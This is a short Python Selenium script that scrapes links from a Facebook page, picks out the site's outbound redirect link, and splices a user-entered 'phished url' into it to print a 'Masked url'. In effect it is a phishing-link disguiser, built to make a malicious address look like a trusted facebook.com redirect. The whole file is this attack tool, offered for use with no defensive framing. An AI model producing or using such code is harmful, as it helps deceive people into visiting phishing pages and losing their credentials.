from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

print("\n")

PATH="C:\Program Files (x86)\chromedriver.exe"
driver=webdriver.Chrome(service=Service(ChromeDriverManager().install()))

driver.get("https://www.facebook.com/youtube/")

contents=driver.find_elements(By.TAG_NAME,'a')

link_list=[]
a=1

for content in contents:
    #print(content.get_attribute("href"))
    link_list.append(content.get_attribute("href"))

red_list=""
token=[]

for i in link_list:
    if "php" in i:
        red_list=i
        break


print("\n Cookie url:",red_list)

fb_link=""

print("\n Enter phished url:")
url=input()

str1=""
str2=""

for i in red_list:
    str1+=i
    if i == '=':
        break

for i in red_list[ : :-1]:
    str2 += i
    if i == '&':
        break

str2=str2[ : :-1]

print('\n Masked url:',str1+url+str2)

driver.quit()

